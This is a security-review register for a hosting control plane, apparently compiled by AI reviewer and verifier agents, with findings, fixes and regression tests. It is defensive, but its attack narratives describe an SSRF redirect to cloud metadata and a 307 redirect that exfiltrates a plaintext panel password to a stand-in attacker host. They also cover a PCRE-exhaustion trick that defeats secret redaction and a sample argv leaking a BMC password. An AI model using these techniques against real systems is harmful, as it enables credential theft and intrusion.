# Security review

Phase 9 of the build.

Eight independent reviewers, one per dimension, each reading the real code rather
than the documentation. Then one adversarial verifier per dimension whose first
instruction was to refute, and whose second was to fix whatever survived.

## Outcome

| | |
|---|---|
| Findings filed | 38 |
| Confirmed | 24 |
| Overstated — real, but not as severe or as reachable as filed | 13 |
| Refuted | 0 |
| Fixed, with a regression test | 32 |

**Nothing was refuted, and that is worth stating rather than celebrating.** A
verifier panel that overturns nothing is either facing unusually careful reviewers
or is not being adversarial enough, and from the inside those look identical. The
thirteen downgrades are the evidence for the first reading: each one names the
guard or the unreachable path that the reviewer missed, and several changed what
the fix had to be. Read the register with that caveat in mind.

Every fix carries a regression test that was verified red before the change and
green after. Where a finding was left unfixed, the reason is recorded with it.

After the phase closed: **1151 tests, 38302 assertions, 0 failures**, `pint --test`
clean. The full suite was run by the coordinator on a single database, not by the
agents in parallel — parallel runs against one schema produce failures that belong
to the harness rather than to the code.

## HIGH — A Throwable in the log context bypasses redaction entirely, so a credential quoted in an exception's `previous` chain (ipmitool's `-P <password>` argv being the worst case) is written verbatim to the structured log Alloy ships to Loki

**Verdict:** CONFIRMED · **Status:** fixed  
**Dimension:** found during verification  
**Location:** `apps/control-plane/src/Modules/Shared/Infrastructure/Logging/SecretRedactor.php`

**On verification.** Verified line by line and then end to end. SecretRedactor::redact()'s match arm was `default => $value` (old line 89), so a non-string, non-array value — an exception object — was returned untouched; RedactSecretsProcessor only calls redactString on the message and redact() on context/extra, so it has no other chance. StructuredLogger calls $formatter->includeStacktraces() on a JsonFormatter, and Monolog's NormalizerFormatter::normalizeException recurses into `previous`. IpmiDedicatedProvider::run() (line 327 for the timeout branch, 339 for the generic Throwable branch) builds $safeCommand via redactCommand() for its own message and context — that part is genuinely correct and the module's tests assert it — and then attaches the raw transport exception as `previous: $e`. Illuminate\Process\Exceptions\ProcessTimedOutException copies Symfony's message, which is the shell-quoted argv. I ran the reviewer's demonstration test unmodified against the real StructuredLogger and it passed (3 tests, 10 assertions), producing `"message":"The process \"'ipmitool' '-I' 'lanplus' '-H' '192.0.2.10' '-p' '623' '-U' 'ADMIN' '-P' 'bmc-root-pass-7Kq3' 'chassis' 'power' 'off'\""` inside a `previous` object, twice down the chain. Where I DISAGREE with the reviewer's framing: they present this as primarily a BMC-credential finding with an honest caveat that it is unreachable today. The caveat is correct — I read DedicatedProviderFactory::connectionFor line 119, `config('dedicated.credentials.'.$reference, [])`, and config/dedicated.php has no `credentials` key at all, so line 132 throws BmcNotConfiguredException and no real BMC password ever reaches ipmitool. But that understates the finding rather than overstating it: the broken control is generic. Every exception Laravel's own handler reports goes out as `['exception' => $e]`, and any transport library that puts a URI, a header or an argv in its message leaks through the same hole today — Guzzle, PDO, the Stripe SDK. That is why I graded it high despite the dead BMC path. Second thing the reviewer missed: the existing command-line pattern `/(?<![A-Za-z0-9_-])(?:-P|-p|--password|--passwd)(?:[=\s]+)…/` requires the separator to be adjacent to the flag, so it matches `-P secret` but NOT the shell-quoted `'-P' 'secret'` that a process exception's message actually contains. Fixing only the Throwable branch without fixing that pattern would have left the BMC password in the log.

**Fix.** Two changes in src/Modules/Shared/Infrastructure/Logging/SecretRedactor.php. (1) Added `public function redactThrowable(Throwable $throwable, int $depth = 0): array`, which flattens a throwable into class / redacted message / code / file / line / redacted getTraceAsString(), recursing into `previous` up to depth 16, and added `$value instanceof Throwable => $this->redactThrowable($value)` as the first arm of the match in redact(). Putting it in redact() rather than in the processor means it also covers the jsonb-column writers (RedactsProviderPayloads, RunProvisioningJob::redactMessage) that share the same object, not just the log. Returning an array rather than the object also means there is no original left for a formatter to re-read. The trace string is scrubbed too because getTraceAsString() renders scalar call arguments unless zend.exception_ignore_args is on. Operator value is preserved: class, file, line and the full previous chain still appear in the log, just scrubbed. (2) Widened the credential-flag pattern to `/(?<![A-Za-z0-9_-])(?:-P|-p|--password|--passwd)["']?(?:[=\s]+)…/` — the optional quote after the flag is what makes it match a shell-quoted argv. I deleted the reviewer's demonstration test (tests/Feature/Security/BmcPasswordLeaksThroughExceptionChainTest.php), which asserts the vulnerability and would have gone red, and replaced it with the regression test below. Verified failing-before by `git checkout --` of SecretRedactor.php and config/logging.php and re-running: 6 of the new assertions fail against the old code, including both tests in ExceptionChainSecretRedactionTest and the shell-quoted-argv data set.

**Regression test.** `apps/control-plane/tests/Feature/Security/ExceptionChainSecretRedactionTest.php — `the_structured_channel_does_not_write_the_bmc_password_from_the_previous_chain` drives the real IpmiDedicatedProvider against a shimmed `ipmitool` that sleeps past the deadline, so the ProcessTimedOutException and its argv are real; it first asserts the password IS in $exception->getPrevious()->getMessage() (so the test cannot pass vacuously if the adapter stops attaching `previous`), then logs it through the real StructuredLogger channel as `['exception' => $e]` and asserts the file contains no password but still contains the placeholder, the exception class and the previous chain. `the_processor_scrubs_any_throwable_in_the_context` covers the generic case through RedactSecretsProcessor with a two-deep chain. Plus, in the module's own test dir, apps/control-plane/tests/Unit/Security/SecretRedactorTest.php: a new `it_scrubs_the_whole_previous_chain_of_a_throwable` case and a new `shell-quoted ipmi argv from a process exception` entry in the embeddedCredentials data provider.`

## HIGH — A hosting reservation identifies "the account this job already holds" by (node, username) only, so one customer's provisioning takes over another customer's account row

**Verdict:** CONFIRMED · **Status:** fixed  
**Dimension:** Provisioning safety, tenant isolation and destructive operations  
**Location:** `src/Modules/SharedHosting/Application/Actions/ReserveHostingNodeCapacity.php`

**As filed.** The idempotency lookup in reserve() matches on hosting_node_id + username and never on customer_id, service_id or the job. A second customer whose requested panel username collides with a row left on the same node by a first customer is handed that first customer's HostingAccount row — re-armed to `pending` and then set `active` by the handler — with customer_id, service_id, hosting_package_id and primary_domain still pointing at the first customer.

**What it gets an attacker.** The username comes straight from the provisioning payload (CreateHostingAccountHandler::username() reads $payload['username']), i.e. from whatever the order flow lets a customer type. An attacker orders shared hosting and asks for a username they know was used and terminated on that node (or simply a common one — 'shop', 'admin', 'wpuser'). Placement puts them on the same node; reserve() returns the previous customer's row; the panel creates the attacker's account under that name; the row goes active still owned by customer_id = victim. From then on the platform's records say the attacker's live account belongs to the victim: anything scoped by customer_id — a portal listing, an SSO session into cPanel, a suspend, a terminate — crosses the tenant boundary in whichever direction it is used, and the victim's future terminate of "their" account deletes the attacker's files (or, with the roles reversed, the victim's row is what the attacker's service now controls). Billing and termination attribution are wrong for the life of the account.

**On verification.** The lookup matched hosting_node_id + username with no customer, service or job in it, and neither branch compared or rewrote customer_id. Demonstrated: a second customer's reserve() returned the first customer's Terminated row, re-armed to Pending, still carrying the victim's customer_id, service_id and primary_domain, and CreateHostingAccountHandler then force-fills it to Active — one live panel account described by another tenant's row, so every customer_id-scoped operation (portal listing, SSO, suspend, terminate) crosses the boundary. Two reachability corrections to the reviewer's narrative: the Active/Suspended variant is largely blunted because the panel itself refuses a duplicate name (the handler's a_retried_job_never_marks_a_live_account_failed test covers that path), so the wide case is the Terminated/Failed row; and no order flow dispatches these jobs yet, so 'an attacker types a username' is not reachable today — the defect is in the code every hosting order will run through. Kept at high because it is a tenant-record boundary, not a bookkeeping nit.

**Fix.** reserve() now refuses when the (node, username) row belongs to a different customer, throwing a new HostingUsernameConflictException ('hosting.username_conflict', 409); the refusal is thrown before the slot is taken and before the licence/capacity checks mutate anything, so the victim's row and the node's account_count are untouched. CreateHostingAccountHandler catches it and returns FailureClass::Permanent — the same name is requested on every retry and no other node was the problem. Deliberately narrow: I did not rewrite service_id / hosting_package_id / primary_domain on the same-customer reuse branch, because serviceId is nullable and overwriting a live value with null would be a new bug; the same-customer staleness is a within-tenant correctness nit, not the boundary. Regression test verified: with the ownership check disabled, 3 of the 4 tests fail (the row is taken over, no exception is thrown, the job succeeds against the victim's row).

**Regression test.** `apps/control-plane/tests/Feature/SharedHosting/HostingUsernameOwnershipTest.php (terminated row of another customer refused and left untouched; live row of another customer refused; the same customer's own earlier attempt is still a retry with one row and one slot; the provisioning job fails Permanent with hosting.username_conflict and the victim's row stays terminated and theirs)`

## HIGH — An address quarantined after a timeout is returned to the pool on a clock, and adoption of the orphan machine never re-claims it — two customers on one address

**Verdict:** CONFIRMED · **Status:** fixed  
**Dimension:** Provisioning safety, tenant isolation and destructive operations  
**Location:** `src/Modules/Ipam/Application/Actions/ReleaseQuarantinedAddresses.php`

**As filed.** ReleaseQuarantinedAddresses selects on `status = 'quarantined' AND quarantined_until <= now()` and ignores quarantine_reason entirely, so a ProvisioningTimedOut quarantine — which the module documents as lasting "until an operator has checked" — expires unconditionally after quarantine_days. AdoptOrphanResource, the platform's documented recovery for exactly that timeout, marks the job succeeded without re-committing the reservation, so the address the adopted machine is configured with is left quarantined and then handed to the next customer.

**What it gets an attacker.** No attacker action is needed to reach it, and the payoff lands on an attacker who simply buys VPSes. A create times out (a hypervisor under load is enough); compensation quarantines the address; an operator finds the VM the cluster really did build and adopts it — the machine goes live, billed, with that address written into its cloud-init. Seven days later the sweeper returns the address to the pool and the allocator hands it to the next customer's machine. Two tenants are now configured with one address on one segment: whichever wins the ARP race receives the other's inbound traffic, including anything terminating on that IP (mail, unauthenticated internal callers, TLS-less services), and the victim's outage reads as a network fault rather than a control-plane one.

**On verification.** Reproduced end to end. IpAllocator::release() quarantines a ProvisioningTimedOut reservation under the comment 'the address sits out until an operator has checked rather than going to the next customer and putting two machines on one address', but the sweeper selected on status + quarantined_until alone and never read quarantine_reason. AdoptOrphanResource — the module's documented recovery for exactly that timeout — writes status, remote_job_id, attempts, result and the service transition and touches no IPAM row, so after adoption the machine is live and billed on an address that is still quarantined and then swept back into the pool. The reviewer's demonstration test passed against the old code and the second customer was handed the identical ip_address_id. No existing test asserted that a timeout quarantine is swept, so the exclusion breaks nothing.

**Fix.** Added ReleaseReason::requiresOperatorClearance() (true for ProvisioningTimedOut only) plus a static list helper, and the sweeper now excludes those rows — written as 'quarantine_reason IS NULL OR NOT IN (...)' because a plain <> would silently stop sweeping reason-less quarantines. Abuse and every other reason still expire on the pool's window. I deliberately did NOT change AdoptOrphanResource to re-claim the address: that crosses module boundaries (Provisioning would have to write IPAM) and the exploitable half — the address reaching a second customer — is closed by the sweeper exclusion alone; the address now stays out of the pool until an operator acts. Follow-up for whoever builds the admin surface: there is currently no operator route or scheduled command for IPAM at all, so a clearance action (release as OperatorAction, or re-commit on adoption) needs to exist when that surface is built. Regression test verified: with the new where() clause removed, the first test fails ('A timeout quarantine was swept back into the pool on a clock', 1 released instead of 0).

**Regression test.** `apps/control-plane/tests/Feature/Security/TimedOutQuarantineIsNotSweptBackIntoThePoolTest.php (timeout quarantine survives adoption and 10x the window, and the next customer gets a different address; an ordinary ServiceTerminated quarantine still expires on the pool's window)`

## HIGH — BMC password survives in the exception `previous` chain and is written verbatim by the structured log channel that ships to Loki

**Verdict:** NOT JUDGED · **Status:** unjudged  
**Dimension:** Secret handling, logging and data exposure  
**Location:** `apps/control-plane/src/Modules/Dedicated/Infrastructure/Providers/IpmiDedicatedProvider.php`

**As filed.** IpmiDedicatedProvider builds a redacted command string for its own message and context — and then attaches the raw transport exception as `previous`, whose message is the full ipmitool argv including `-P <password>`; RedactSecretsProcessor cannot reach it because it only rewrites strings and arrays, never a Throwable in the log context, so Monolog's JsonFormatter serialises the chain and the plaintext BMC root password lands in storage/logs/lynomia.json.

**What it gets an attacker.** Any code path that reports one of these exceptions the way Laravel's own reporter does — `log(..., ['exception' => $e])` — writes the credential. Concretely: a `report()` of an uncaught DedicatedProviderException (SyncHardwareInventory::execute re-throws it by documented contract, `@throws DedicatedProviderException`, and nothing above it catches), a queue failure (`failed_jobs.exception` stores `(string) $e`, which PHP renders with the whole previous chain), or Horizon's failed-job view. Grafana Alloy tails lynomia.json and pushes it to Loki (infrastructure/monitoring/alloy/config.alloy), so the credential becomes readable by everyone with Grafana access and sits in Loki's chunks for the retention period. A BMC/IPMI credential is power control and virtual media on a physical host — an attacker with it can power-cycle or netboot-reinstall a customer's dedicated server, and read its disks by booting their own image. Reachability caveat, stated honestly: config/dedicated.php ships no `credentials` map (config('dedicated.credentials.<ref>') is always []), so today DedicatedProviderFactory refuses to build a real connection and no real password exists to leak. The leak is deterministic the moment the secret store is wired, which is what .env.example promises ("configured per-server in the infrastructure inventory"). The same `previous: $e` pattern is at ProxmoxComputeProvider.php:601/613, CpanelHostingProvider.php:415/431/442, DirectAdminHostingProvider.php:398/414/422 and RedfishDedicatedProvider.php:722/732; those attach Guzzle ConnectionExceptions whose messages do not quote headers, so IPMI is the severe case because argv is the only place ipmitool takes a password.

## HIGH — Email verification is never sent and never enforced: User uses the MustVerifyEmail trait but does not implement the contract

**Verdict:** CONFIRMED · **Status:** fixed  
**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Modules/Identity/Infrastructure/Models/User.php`

**As filed.** `User` declares `class User extends Authenticatable` with no `implements` clause. It picks up the `MustVerifyEmail` *trait* from `Illuminate\Foundation\Auth\User` but not the `Illuminate\Contracts\Auth\MustVerifyEmail` *contract*, and every framework enforcement point is an `instanceof` check against the contract. Result: registration never sends a verification mail, and the `verified` middleware guarding the entire /api/admin group waves unverified users straight through. The platform's claimed "one consistent gate" before ordering does not exist anywhere in the codebase.

**What it gets an attacker.** Register at POST /api/v1/register with any address you do not control — a competitor's, a real customer's, or a throwaway. The API answers 201 with `meta.email_verification_required: true`, no mail is ever sent, and nothing in the product ever checks `email_verified_at`. The account is immediately fully usable: sign in, place orders, provision servers, attach payment details. On a platform that runs real hardware and holds card data this is the fraud/chargeback path — every service is ordered by an account whose address was never proved, and the abuse-response playbook ("we emailed the address on file") reaches nobody. Separately, /api/admin is protected by `['auth:sanctum','verified']`; the `verified` half is inert, so any principal that reaches the admin prefix is one middleware short of what the route file claims.

**On verification.** Read the class: `class User extends Authenticatable` with no `implements` clause, and every framework enforcement point is an instanceof against Illuminate\Contracts\Auth\MustVerifyEmail. Verified all three consequences by test against the unfixed model: (a) `Notification::assertSentTo(..., VerifyEmail::class)` fails after a real POST /api/v1/register that returns 201 with meta.email_verification_required=true; (b) a probe route carrying exactly the /api/admin stack ['auth:sanctum','verified'] returns 200 for a user with email_verified_at NULL; (c) the model is not an instance of the contract. One detail the reviewer did not catch strengthens it: NotificationRoutingServiceProvider:46-55 registers `VerifyEmail::createUrlUsing(static fn (MustVerifyEmail $notifiable) => ...)`, so even if the listener had fired, generating the link would have thrown a TypeError — the verification path could never have worked at all. On a platform that racks hardware and stores cards, an account whose address was never proved is the fraud and chargeback path, and the abuse playbook that mails the address on file reaches nobody.

**Fix.** Added `implements MustVerifyEmail` (the contract) to User plus a docblock paragraph saying why the trait alone is not enough. That is the whole change — no behaviour was reimplemented, the framework's listener and middleware now simply engage. Regression test tests/Feature/Identity/EmailVerificationEnforcementTest.php (4 tests): the model implements the contract; registration actually sends VerifyEmail; the link *taken from the sent notification* (not hand-built with URL::temporarySignedRoute, which is how the existing E2E test missed this) verifies the address; and the `verified` middleware 403s an unverified user while passing a verified one. Verified by reverting: with `class User extends Authenticatable` restored, all 4 fail (no contract, notification not sent x2, 200 instead of 403). With the fix: 4 passed, 12 assertions. Full tests/Feature/Identity + tests/Feature/EndToEnd suite green afterwards (67/67), including PurchaseToActiveServiceTest which exercises registration and verification end to end.

**Regression test.** `apps/control-plane/tests/Feature/Identity/EmailVerificationEnforcementTest.php`

## HIGH — Every customer VM is attached to the hardcoded bridge `vmbr0`, untagged — the subnet's own network, VLAN and customer-facing flag are never consulted

**Verdict:** CONFIRMED · **Status:** fixed  
**Dimension:** Provisioning safety, tenant isolation and destructive operations  
**Location:** `src/Modules/Vps/Application/Handlers/CreateVpsHandler.php`

**As filed.** CreateVpsHandler builds CreateVmRequest without networkBridge or vlanTag, so every VM the platform creates lands on the DTO default `vmbr0` with no VLAN tag, regardless of the `bridge` / `vlan_id` / `is_customer_facing` recorded on the Network the address was allocated from; Network::acceptsCustomerAttachments() is dead code, called from nowhere in src/ or tests/.

**What it gets an attacker.** An attacker buys the cheapest VPS. Their machine is created on `vmbr0` with no VLAN tag. On a stock Proxmox host vmbr0 is the management bridge, so the VM has a NIC on the same layer-2 segment as the hypervisor management interfaces and (where the BMC shares it) the out-of-band controllers that can power-cycle and reinstall every machine in the rack — the exact lateral-movement path IpPoolScope::isCustomerAllocatable() and IpAllocator::assertScopeMayServe() were written to close, bypassed one layer lower. Even where vmbr0 carries no management traffic, every tenant's VM shares one untagged broadcast domain whatever VLAN their subnet says they belong to, so ARP/NDP spoofing between customers costs nothing.

**On verification.** Verified against the code: CreateVpsHandler built CreateVmRequest with no networkBridge/vlanTag, so every VM took the DTO default 'vmbr0' (CreateVmRequest.php:39-40) and ProxmoxComputeProvider.php:428-431 emitted 'virtio,bridge=vmbr0' with no tag. grep confirms Network::acceptsCustomerAttachments() had no caller anywhere in src/ or tests/. The reviewer's deployment claim is stronger than they knew: infrastructure/ansible/inventories/production/hosts.yml gives every pve node vmbr0 on eno1, which is also proxmox_management_interface, and marks it vlan_aware — so an untagged NIC lands on that bridge's native VLAN, i.e. beside the hypervisor management interface, while database/seeders/InfrastructureSeeder.php records the customer network as vlan_id 100. Every tenant therefore shared one untagged broadcast domain whatever VLAN their subnet named, and IPAM's careful pool-scope guard (IpAllocator::assertScopeMayServe) was bypassed one layer lower. Reachability caveat that applies to this whole dimension: nothing yet dispatches provisioning jobs (CreateProvisioningJob has no callers in src/), so this is the production build path rather than a live attack today.

**Fix.** CreateVpsHandler now resolves $address->subnet->network and refuses the build (FailureClass::Permanent, 'vps.network_not_attachable') when the network is missing, not customer-attachable, or has no bridge recorded; otherwise it passes networkBridge and vlanTag from that row. The refusal happens before the provider call, so the one irreversible step is never reached. tests/Feature/Vps/CreateVpsHandlerTest.php's fixture subnet now carries a customer network (that is the correct configuration; without a network the platform cannot say where the machine would be plugged in). I did NOT remove the 'vmbr0' default from CreateVmRequest — making it required would reorder the constructor's optional parameters and widen the change; the residual risk is that a future caller repeats the omission. Regression test verified: with the resolution and the two named arguments reverted, all 3 tests in VpsNetworkAttachmentTest fail (bridge 'vmbr0' instead of 'vmbr1'; both refusal cases succeed instead).

**Regression test.** `apps/control-plane/tests/Feature/Vps/VpsNetworkAttachmentTest.php (3 tests: bridge+VLAN reach the hypervisor; a subnet with no network is refused with nothing asked of the provider; a management network is refused even with is_customer_facing set)`

## HIGH — Every provider adapter follows HTTP redirects to any host the device names — SSRF, and on 307/308 the request body (a customer's plaintext panel password) is re-POSTed off-host

**Verdict:** CONFIRMED · **Status:** fixed  
**Dimension:** Injection, deserialisation and untrusted input  
**Location:** `src/Modules/Dedicated/Infrastructure/Providers/RedfishDedicatedProvider.php`

**As filed.** None of the four real provider adapters (Redfish, Proxmox, cPanel/WHM, DirectAdmin) disables redirect following, so Guzzle's default allow_redirects (max 5, protocols http+https) applies: a managed device can point any request the platform makes at an arbitrary host, and for a 307/308 Guzzle preserves the method and the body — which for DirectAdmin CMD_API_USER_PASSWD / CMD_API_ACCOUNT_USER and WHM createacct contains the customer's plaintext panel password.

**What it gets an attacker.** An attacker who controls what a managed device answers — a compromised BMC or cPanel/DirectAdmin node, a reseller-operated node, a MITM against any row with verify_tls=false, or DNS control over a node hostname — answers the platform's request with 302/307 and a Location of their choosing. (1) SSRF: `302 Location: http://169.254.169.254/latest/meta-data/...` makes the queue worker — which sits on the management network — fetch an arbitrary internal URL, and the body it finds is JSON-decoded and used as inventory. This completely bypasses RedfishDedicatedProvider::resolveLink(), the off-host @odata.id check the class documents as its whole SSRF mitigation, because the URL never becomes a link in a body. (2) Credential exfiltration: `307 Location: https://collector.attacker.test/collect` on a change-password or create-account call re-POSTs the form body, so `passwd=<plaintext>` lands on the attacker's host. Guzzle does strip Authorization cross-origin, so the platform's own login key / BMC Basic / PVEAPIToken is not leaked — the body is. The adapter then reports an ordinary provider failure and the operator sees nothing unusual.

**On verification.** Read all four request() builders (RedfishDedicatedProvider.php:772, ProxmoxComputeProvider.php:652, CpanelHostingProvider.php:483, DirectAdminHostingProvider.php:464 pre-fix). Every one sets 'verify' explicitly and says nothing about redirects, so Guzzle's RedirectMiddleware default applies. grep for allow_redirects / withoutRedirecting / max_redirects across src/, app/, config/, tests/ returns nothing, and these four are the only Http:: client construction sites in the application. I did not take the reviewer's word for the transport behaviour: I ran both demonstration tests against unmodified code and they passed, then wrote my own and watched them fail pre-fix. Redfish: a 302 from 192.0.2.10 with Location http://169.254.169.254/... was followed, the metadata body was JSON-decoded and powerState() returned 'on' from it. That is a complete bypass of resolveLink() (line 611), which the class documents at length as the mitigation for exactly this — but resolveLink only ever sees a link inside a body, and a Location header never becomes one. Proxmox: pre-fix the 301 was followed and the attacker's body reached dataFrom(), failing only later with 'the cluster accepted the request but returned no UPID' — an ordinary provider error an operator would read as a flaky cluster. DirectAdmin: a 307 on changePassword() re-POSTed passwd=<plaintext> to collector.attacker.test with the method preserved; Guzzle does strip Authorization cross-origin, so the reviewer is right that the platform's own login key survives and the customer's password is what leaks. Reachable by anyone who controls what a managed device answers: a compromised BMC, a reseller-operated node, DNS control over a node hostname, or a MITM against any row with verify_tls=false.

**Fix.** Added 'allow_redirects' => false to request() in all four adapters, and an assertNotRedirect() at each adapter's single send() choke point that refuses a 300-399 status. The second half is not redundant: Laravel's Response::failed() is false for a 3xx, so with redirects merely disabled a 302 would have been read as an empty success — an empty Redfish resource, a Proxmox envelope with no data, a DirectAdmin body with no error=1 (which that adapter's whole design treats as success). The refusal is flagged indeterminate: a node that answered a createacct or a reset with a redirect may still have acted on it, and invariant 4 says such a thing is quarantined, not retried. Regression tests: tests/Feature/Security/ProviderAdaptersFollowRedirectsOffHostTest.php (Redfish, Proxmox, WHM) and tests/Feature/Security/HostingNodeRedirectExfiltratesPanelPasswordTest.php (DirectAdmin 307, which also asserts the password is absent from the exception message and context the platform logs). I rewrote both of the reviewer's demonstration files, which asserted the vulnerable behaviour and would have pinned it. Verified by reverting: git stash of the four adapters makes all four of these tests fail, with the Proxmox one failing on 'no UPID' — i.e. proving the redirect was followed and the attacker's body parsed. Restored, all pass. Existing suites: tests/Unit/{SharedHosting,Compute,Dedicated,Security} 175/175, and the full touched scope 383/383.

**Regression test.** `apps/control-plane/tests/Feature/Security/ProviderAdaptersFollowRedirectsOffHostTest.php and apps/control-plane/tests/Feature/Security/HostingNodeRedirectExfiltratesPanelPasswordTest.php`

## HIGH — PaymentCaptured is dispatched inside the webhook's open transaction, so a queue worker can find the capture missing and silently abandon settlement

**Verdict:** CONFIRMED · **Status:** fixed  
**Dimension:** Payment integrity, webhooks and money movement  
**Location:** `apps/control-plane/src/Modules/Payments/Application/Actions/RecordPaymentCapture.php`

**As filed.** The event that drives invoice settlement and fulfilment is pushed to the queue while the capture row is still uncommitted, and the listener that finds it missing logs a warning and returns rather than retrying — so a captured payment can end with no service and no recovery path.

**What it gets an attacker.** Not attacker-driven; it is a load-triggered loss. Redis (production QUEUE_CONNECTION per .env.example) shares no transaction with PostgreSQL and every connection in config/queue.php sets 'after_commit' => false, so the SettleInvoiceOnPaymentCaptured job is runnable the instant event() is called — which happens inside IngestWebhookEvent's DB::transaction (line 104). The webhook has already answered 200 and webhook_events.status is 'processed', so no provider redelivery re-runs it either. Net effect: the customer's card is charged, the invoice stays Open, the order stays pending_payment, no subscription is started, no server is provisioned, and nothing anywhere retries. The window widens exactly when the database is slow — the same condition that makes providers redeliver.

**On verification.** Every link in the chain holds. RecordPaymentCapture.php:84 called event() after its own inner DB::transaction closed, but IngestWebhookEvent.php:104 wraps handleUnderLock() — and therefore the whole capture — in DB::transaction(), so the event left at transaction level 1. config/queue.php sets 'after_commit' => false on database (l.46), beanstalkd (l.55), sqs (l.64) and redis (l.73); .env and .env.example both set QUEUE_CONNECTION=redis, a store that shares no transaction with PostgreSQL, so SettleInvoiceOnPaymentCaptured (ShouldQueue, queue 'payments') was runnable the instant it was pushed. SettleInvoiceOnPaymentCaptured.php:68-78 then did `Log::warning(...); return;` when Transaction::find() came back null, with a comment saying the return is deliberate so the job is never retried. The webhook has already answered 200 and webhook_events.status is 'processed', so no provider redelivery re-enters either. I proved the visibility claim directly rather than by winning a race: a second real PDO connection, read from inside the listener at dispatch time, could not see the capture row, and DB::connection()->transactionLevel() was 1. This is the only one of the four findings on a wired path — POST /webhooks/{provider} is live. The contrast the reviewer drew is also fair: SettleInvoice.php:211 already does the correct thing for the next hop with DB::afterCommit(). Not attacker-driven, but a database slow enough to widen the window is exactly the condition that makes providers redeliver, so the loss clusters under load.

**Fix.** Two changes. (1) RecordPaymentCapture now builds the PaymentCaptured and dispatches it through DB::afterCommit() when DB::transactionLevel() > 0, and immediately otherwise, so the announcement waits for the outermost commit rather than only for its own inner transaction. The explicit level check is not decoration: Laravel's DatabaseTransactionsManager::callbackApplicableTransactions() returns one pending list spanning all connections and addCallback() takes ->last(), so a bare DB::afterCommit() attached the callback to an unrelated connection's open transaction and lost it on that transaction's rollback — which broke the existing tests/Feature/Payments/ConcurrentCaptureTest::two_workers_recording_the_same_capture_produce_one_transaction (PaymentCaptured dispatched 0 times instead of 1). With the guard that test passes again. (2) SettleInvoiceOnPaymentCaptured no longer swallows a capture it cannot read: it still logs, then throws the new UnsettleableCaptureException (src/Modules/Billing/Domain/Exceptions/UnsettleableCaptureException.php), so the job runs its 5-try backoff and, if the rows really are gone, lands in the failed queue where a charge with no service is visible. The null-invoiceId early return (a wallet top-up) is untouched. Verified by reverting: with DB::afterCommit removed the dispatch test fails with 'PaymentCaptured must not be dispatched inside an open database transaction. Failed asserting that 1 is identical to 0.'

**Regression test.** `apps/control-plane/tests/Feature/Security/PaymentCapturedIsDispatchedOnlyAfterTheCaptureCommitsTest.php (rewritten from the reviewer's demonstration; asserts transactionLevel 0, that a second connection can read the capture at dispatch time, and that the invoice actually settles) and apps/control-plane/tests/Feature/Billing/SettleInvoiceOnPaymentCapturedTest.php (new; asserts the listener throws UnsettleableCaptureException for an unreadable capture and still returns quietly for a capture with no invoice)`

## LOW — Forgot-password endpoint leaks account existence through a synchronous SMTP round trip

**Verdict:** OVERSTATED · **Status:** not fixed  
**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Modules/Identity/Http/Controllers/PasswordResetController.php`

## LOW — SecretRedactor silently skips a redaction pattern when PCRE aborts, and its PEM pattern is quadratic

**Verdict:** CONFIRMED · **Status:** fixed  
**Dimension:** Injection, deserialisation and untrusted input  
**Location:** `src/Modules/Shared/Infrastructure/Logging/SecretRedactor.php`

**As filed.** redactString() ignores a null return from preg_replace, which is exactly what PCRE returns when the backtrack limit is exhausted — so on a large enough input a pattern silently does not run, and the value it was meant to mask passes through unredacted.

**What it gets an attacker.** Reachable only from a hostile managed device, and mostly self-defeating (the device would have to supply both the oversized string and the secret it wants unmasked), so I am reporting it as a robustness defect rather than a live exploit. It matters because the failure is silent by construction: the whole class exists so redaction is not a call-site convention, and this is a path where redaction quietly does not happen. Measured: the PEM pattern's `.*?` scans to end-of-string from every `-----BEGIN` start position, so a 1.2 MB string of repeated `-----BEGIN … PRIVATE KEY marker-----` with no END exhausts pcre.backtrack_limit; preg_replace returns null and the pattern is dropped for that value. DirectAdminHostingProvider parses a node's whole response body with parse_str and passes the result to redact() without truncation, so a node can choose the size.

**On verification.** redactString() ignored a null from preg_replace, which is precisely what PCRE returns when it gives up. I reproduced the abort independently: str_repeat('-----BEGIN … PRIVATE KEY marker-----', 40000) is 1,160,000 bytes and preg_replace with the PEM pattern returns null with preg_last_error_msg() == 'Backtrack limit exhausted', because the lazy .*? rescans to end-of-string from every BEGIN position. The reviewer under-stated one detail that actually matters for judging it: the loop continues, so only the abandoned pattern is dropped — the leak needs the abandoned pattern to be the one that would have masked the secret. That case is constructible and I built it: 40,000 unterminated BEGIN markers followed by a genuine RSA key, whose base64 body came through the old redactor intact. DirectAdminHostingProvider parses a node's whole response body with parse_str and hands the result to redact() with no truncation, so a hostile node does choose the size. Severity low is right — it is self-defeating as a primary exploit — but this is invariant 5's own class, whose entire stated reason for existing is that redaction is a processor and not a call-site convention, and a silent no-op is the one failure mode it must not have.

**Fix.** redactString() now fails closed: a null from preg_replace returns the placeholder for the whole value rather than skipping the pattern. A value the redactor could not fully examine is discarded instead of emitted — a missing log line is recoverable, a logged BMC password is not. One-line change plus the comment explaining the failure mode, kept small deliberately: another verifier is editing this same file for the secrets dimension (PVEAPIToken and whm patterns, redactThrowable), and this change is a separate hunk that does not touch theirs. Regression test: tests/Feature/Security/RedactionSilentlySkipsAPatternWhenPcreAbortsTest.php — 2 tests. The first asserts the PCRE abort is real (assertNull on the raw preg_replace) before asserting the key's base64 body is absent from the output, so it can never pass for the wrong reason; the second is a control proving an ordinary string is still redacted in place and not needlessly discarded. Verified by reverting: the leak test fails against the old code with the key body present in the output. tests/Unit/Security passes 100%.

**Regression test.** `apps/control-plane/tests/Feature/Security/RedactionSilentlySkipsAPatternWhenPcreAbortsTest.php`

## LOW — The two-factor rate limiter key is always empty: `$request->input('email')` does not exist on that endpoint

**Verdict:** CONFIRMED · **Status:** fixed  
**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Providers/RateLimitServiceProvider.php`

**As filed.** `defineAuthLimiter('two-factor', 'two_factor')` builds its key from `$request->input('email')`, but `POST /api/v1/login/two-factor` validates and receives only `challenge_token` and `code` — there is no `email` field on that request. The key therefore degenerates to the constant string `'|'.$ip`: a single shared 5-per-minute bucket per source address covering every user's second-factor submissions.

